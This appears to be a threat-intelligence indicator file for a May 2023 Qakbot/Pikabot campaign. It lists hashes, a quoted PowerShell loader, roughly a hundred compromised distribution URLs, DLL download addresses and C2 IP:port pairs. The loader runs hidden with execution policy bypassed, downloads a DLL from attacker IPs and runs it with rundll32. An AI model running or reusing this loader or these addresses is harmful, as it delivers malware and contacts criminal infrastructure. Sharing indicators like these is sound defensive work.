@@ -1,0 +1,182 @@
+18.05.2023 | Qakbot / Pikabot | BB28 | Campaign  | Version
+
+*************************************************
+
+.url https://123mkv.dev/iia/?1
+.js 1015b0f17a4a19921e44338e91f937def92b0f497a74e1de46654a0986fc7646
+.dll 8ee9141074b48784c89aa5d3cd4010fcf4e6d467b618c8719970f78fcc24a365
+
+*************************************************
+
+Exec >
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Fgdi.js
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Fgdi.js ExtirpationistStronglike Theologizing deepmouthed Micropegmatite 
+
+powershell.exe - WindowStyle Hidden - ExecutionPolicy Bypass - NoLogo - NoProfile - encodedcommand $Preexchanged = "aAB0AHQAcABzADoALwAvAFQAbwBrAGUAbgBzAC4AZgB5AGkAroaAB0AHQAcABzADoALwAvAFAAbABvAHcAbQBlAG4AQQBsAGwAbwB5AGEAZwBlAC4AYwByAHUAaQBzAGUAcwA=roaAB0AHQAcAA6AC8ALwAxADYAMAAuADQANQAuADUANQAuADEAOQAyAA==";
+$Xenopeltid = "aAB0AHQAcABzADoALwAvADIANAAwAC4ANgA5AC4AMQAwADUALgAyADIANQA=kyaAB0AHQAcAA6AC8ALwAxADgANwAuADEAOAAxAC4ANQAzAC4AMQAyADAAkyaAB0AHQAcABzADoALwAvADQAMwAuADIAMgA1AC4AMQAzADcALgA4ADIAkyaAB0AHQAcABzADoALwAvAEIAeQBwAGEAcwBzAGUAZAAuAGMAbwBtAA==";
+Start - Sleep - Seconds 9;
+$ceratophrysCriocephalus = "aAB0AHQAcABzADoALwAvAEkAbgB0AGUAcgBtAGUAbgBzAHQAcgB1AHUAbQBVAG4AcABhAG4AbgBpAGUAcgBlAGQALgB0AG8AawB5AG8AfRxaAB0AHQAcABzADoALwAvAGEAYwBpAGQAbwBsAG8AZwB5AC4AcQB1AGUAYgBlAGMA";
+$Vacationers = "aAB0AHQAcAA6AC8ALwBVAG4AdwBpAG4AdAByAHkALgBnAHMAaUOaAB0AHQAcAA6AC8ALwByAGUAcAByAGUAcwBlAG4AdABhAG0AZQBuAC4AcwBvAGwAYQByAA==aUOaAB0AHQAcABzADoALwAvADIAMwAzAC4AOQA3AC4AMgA1ADEALgAxADcANAA=aUOaAB0AHQAcAA6AC8ALwBEAG8AbABsAGEAcgBiAGkAcgBkAEcAZQBvAGMAaABlAG0AaQBzAHQAcgB5AC4AaQBuAHMAdABpAHQAdQB0AGUA";
+$celioncusSacrilegiousness = "http://77.91.85.124/pNXY/wUA7n http://176.124.198.214/rAAOuv6/DBJLR http://77.91.87.226/2kUY1F/yEZhqwIFC8R0";
+foreach($qantar in $celioncusSacrilegiousness - split "yF") {
+    $defeatsPreassumption = "aAB0AHQAcAA6AC8ALwBBAGIAagB1AGQAaQBjAGEAdABpAG8AbgBWAGkAbABsAGEAaQBuAGUAcwBzAC4AZwByAGkAcABlAA==";
+    try {
+        $Fricatrice = "aAB0AHQAcAA6AC8ALwAyADQANAAuADEAMwAxAC4AMQAyADQALgAyADIAMQA=aRwIaAB0AHQAcABzADoALwAvAE0AYQB1AHAAYQBzAHMAYQBuAHQALgBjAG8AZABlAHMA";
+        $raidingDefectlessness = "aAB0AHQAcAA6AC8ALwA3ADQALgAxADgAMgAuADEAOAA1AC4AMQAwADgA";
+        $Plebiscitarism = "aAB0AHQAcABzADoALwAvADEAOQA1AC4AMgA0ADEALgAyADAAMQAuADgANAA==oTaAB0AHQAcAA6AC8ALwBEAGUAdABpAG4AZQB0AFQAaAB5AHIAbwBpAGQAZQBhAGwALgBjAHIAaQBjAGsAZQB0AA===oTaAB0AHQAcAA6AC8ALwAxADQANgAuADEAOAA5AC4AMQA3ADMALgAxADQAMQA==oTaAB0AHQAcAA6AC8ALwBuAGUAcABoAHIAbwBwAHMALgBrAGkAdwBpAA==";
+        $unwrapperedProtoporphyrin = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($qantar));
+        iwr $unwrapperedProtoporphyrin - O $env: TEMP\ amphibolostylous.grommets;
+        $Extollation = "aAB0AHQAcABzADoALwAvAFYAYQBsAGsAeQByAGkAYQBPAHYAZQByAGMAaQByAGMAdQBsAGEAdABlAC4AbABlAGEAcwBlAA==xRaAB0AHQAcABzADoALwAvADEAMAA3AC4AMgAxADQALgAxADEAMgAuADEANgA3AA==xRaAB0AHQAcAA6AC8ALwA4ADkALgAxADMANQAuADEAMgA4AC4AMgA0ADUA";
+        if ((Get - Item - Path $env: TEMP\ amphibolostylous.grommets).Length - ge 250435) {
+            powershell - encodedcommand "start rundll32 $env:TEMP\amphibolostylous.grommets,Test;Expressjs";
+            $bridesmaidingPlaintiveness = "aAB0AHQAcABzADoALwAvAGIAbwBvAHQAZQBlAHMALgBxAHUAZQBiAGUAYwA=mKaAB0AHQAcAA6AC8ALwA5ADYALgAyADAANAAuADIAMQA0AC4AMQAzADUAmKaAB0AHQAcABzADoALwAvADEAMQA0AC4AMQAxADcALgAyADAAOAAuADEAMgAxAA==mKaAB0AHQAcAA6AC8ALwA1ADYALgAyADEANAAuADEANQAwAC4ANwAxAA==";
+            $PoultrydomLipide = "aAB0AHQAcABzADoALwAvAHQAYQBpAGwAbwByAGwAeQBTAGUAbQBpAGQAZQB0AGUAcgBtAGkAbgBpAHMAdABpAGMALgBpAG0AbQBvAGIAaQBsAGkAZQBuAA==OtlaAB0AHQAcABzADoALwAvADEANgAxAC4ANwA2AC4AOAAyAC4AMQAyADcAOtlaAB0AHQAcAA6AC8ALwA0ADAALgAxADMANAAuADEAMAA5AC4AMQA5ADUA";
+            $chokermanForfault = "aAB0AHQAcABzADoALwAvAEwAbwBvAGYAaQBlAC4AZwBvAGwAZgA=hFKaAB0AHQAcABzADoALwAvADEANgAzAC4AOAA2AC4AMgAyADEALgAyADMANgA=hFKaAB0AHQAcAA6AC8ALwAxADcAMwAuADIAMgA5AC4AMQA4ADEALgAxADAAMgA=";
+            break;
+        }
+        Expressjs;
+    } catch {
+        $placaeanObtected = "aAB0AHQAcAA6AC8ALwBlAG4AdABpAHIAZQB0AHkAQQBmAGYAZQBjAHQAZQBkAC4AcABhAHIAdABuAGUAcgBzAA==aaAB0AHQAcABzADoALwAvADEAOAAxAC4AMQAwADIALgA4ADQALgAxADcAOAA=";
+        $HlorrithiTurdetan = "aAB0AHQAcAA6AC8ALwBCAGEAcwBhAGwAdABpAGYAbwByAG0ARABlAHQAbwBuAGEAdABvAHIALgBjAHIAaQBjAGsAZQB0AA==";
+        $UnpuzzledSpeculate = "aAB0AHQAcAA6AC8ALwAxADUAOAAuADEANgA1AC4ANQAyAC4AMQA2ADcAbaAB0AHQAcABzADoALwAvAHMAcAByAHUAcwBoAC4AcwBpAA==baAB0AHQAcABzADoALwAvAG4AbwBuAGkAbgB0AHIAdQBzAGkAbwBuAGkAcwBtAC4AcwB0AHIAZQBhAG0A";
+    }
+}
+$lasarwortArborolatry = "aAB0AHQAcAA6AC8ALwBTAHkAbABsAGEAYgBpAGYAaQBlAGQALgBiAHUAcwBpAG4AZQBzAHMA";
+$syngamicMetrocarcinoma = "aAB0AHQAcAA6AC8ALwAxADQAMwAuADEAMwAzAC4ANQA0AC4AMQA2ADQA";
+
+*************************************************
+
+.zip distro
+
+https://123mkv.dev/mmi/?1
+https://aamazehomes.com/cqsu/?1
+https://acontecimientomundial.com/asuq/?1
+https://adhyaystudio.com/as/?1
+https://alberthvac1.com/mua/?1
+https://aprendainvestimentos.com/or/?1
+https://autobom.org/eo/?1
+https://batsamco.com/vulq/?1
+https://bespokecj.com/mp/?1
+https://bmetal.co.uk/lno/?1
+https://chiomastech.com/opn/?1
+https://cointrasur.com/siuc/?1
+https://dgisafe.com/aet/?1
+https://divine-project.com/ne/?1
+https://doidealbest.com/cie/?1
+https://e-sophtgh.com/euc/?1
+https://ejbreneman.com/noo/?1
+https://esjpakistan.com/ndie/?1
+https://etiskin.com/be/?1
+https://flixfallen.com/oi/?1
+https://futureadvisorconsultant.com/seia/?1
+https://garagedoorrepairhalifax.com/eera/?1
+https://genesisoman.com/aluq/?1
+https://gprproperty.com/uqaq/?1
+https://growtharbor.com/mtl/?1
+https://heissa-artie.com/ni/?1
+https://hirabsun.com/mie/?1
+https://imagecolorist.com/tov/?1
+https://imobiliariadigitalimoveis.com/aquu/?1
+https://instantfunnellab.com/anis/?1
+https://jacksonkatz.com/dia/?1
+https://jobs-sa.net/ei/?1
+https://joker123truewallet.net/tes/?1
+https://kingspalaceacademy.com/aeat/?1
+https://lacasadespain.com/uii/?1
+https://lebapedia.com/ma/?1
+https://lyhourgroup.com/imt/?1
+https://masr-alalmanya.com/au/?1
+https://meetxgirls.com/dud/?1
+https://mena-studies.org/ni/?1
+https://mortalflix.com/rpe/?1
+https://myiclicktv.com/pl/?1
+https://nutriapt.com/mnei/?1
+https://opencarboncredits.com/cm/?1
+https://opponepalcampaigns.com/aou/?1
+https://plasticmetal.it/aeo/?1
+https://position1seo.co.uk/emeu/?1
+https://prixpharma.com/reib/?1
+https://reposebay.com/rii/?1
+https://rishtedar.com/deot/?1
+https://sahityaclasses.com/bst/?1
+https://salmanpoultry.com/eqbu/?1
+https://seedsindia.org/uae/?1
+https://sercompublicidad.net/st/?1
+https://shilhaandara.com/lru/?1
+https://shotvet.com/iul/?1
+https://stacksmind.com/et/?1
+https://standardlife.org.ng/oiel/?1
+https://streamingbage.net.br/tor/?1
+https://sufirfan.org/lvu/?1
+https://sumeetgroup.com/aa/?1
+https://talentopportunities.net/nmnu/?1
+https://tebiyu.com/mis/?1
+https://thebossstory.com/qise/?1
+https://thedesignors.com/pu/?1
+https://theman-cave.com/oet/?1
+https://thephoolmala.com/ties/?1
+https://tollywoodindustry.com/ti/?1
+https://torunit.com/uud/?1
+https://trentosignal.com/qer/?1
+https://trinifieds.com/tmlp/?1
+https://uaelistingsonline.com/rg/?1
+https://visaexpressbd.com/mmii/?1
+https://voxforem.co.uk/qou/?1
+https://web3solution.com/ists/?1
+https://worldsanalytics.com/solt/?1
+https://xpia-i.com/es/?1
+https://yarrowenterprise.com/ut/?1
+https://yayasanadeazhar.com/mucu/?1
+https://abuylike.com/or/?1
+https://amazonbirding.com/ial/?1
+https://asgharintl.net/uu/?1
+https://awamia.com/cii/?1
+https://biddyaniketonhighschool.com/isf/?1
+https://book4noon.com/uiiu/?1
+https://bowwowavenue.com/enc/?1
+https://cloud47options.com/irdp/?1
+https://datastatresearch.org/xpa/?1
+https://elibact.com/aeat/?1
+https://fiestashawaianas.com/tar/?1
+https://fsclbd.com/mtls/?1
+https://ilcerchio-gruppoanalisi.it/omcs/?1
+https://imanagementpro.com/ipt/?1
+https://jaridh.com/ma/?1
+https://jojoexports.com/rde/?1
+https://jyothyvidyalaya.org/ansd/?1
+https://karwanfoodstuffs.com/tdse/?1
+https://lokhandwalaminerva.com/ttu/?1
+https://morningstarfoundation.org.ng/acvo/?1
+https://neelikon.co.uk/sa/?1
+https://optimalsolutionsonline.com/sb/?1
+https://poshcutz.com/idoo/?1
+https://pricelala.com/srs/?1
+https://publiext.com/re/?1
+https://re-corre.com/qoxu/?1
+https://skillprism.org/tau/?1
+https://studemate.com/lm/?1
+https://techafresh.com/epia/?1
+https://treaty4news.com/sot/?1
+https://trentosignal.com/ig/?1
+https://tudien.org.vn/dif/?1
+https://ugssecurity.com/od/?1
+https://windowcollections.com/eoap/?1
+https://worldtravel-trip.com/iit/?1
+
+.dll distro
+
+http://77.91.87.226/2kUY1F/53UFrK
+http://77.91.85.124/pNXY/s495BLC
+http://176.124.198.214/rAAOuv6/IklFOWuh
+
+*************************************************
+
+c2's
+
+192.9.135.73:1194
+45.85.235.39:2078
+129.80.164.200:32999
+129.153.135.83:2078
+129.213.54.49:2078
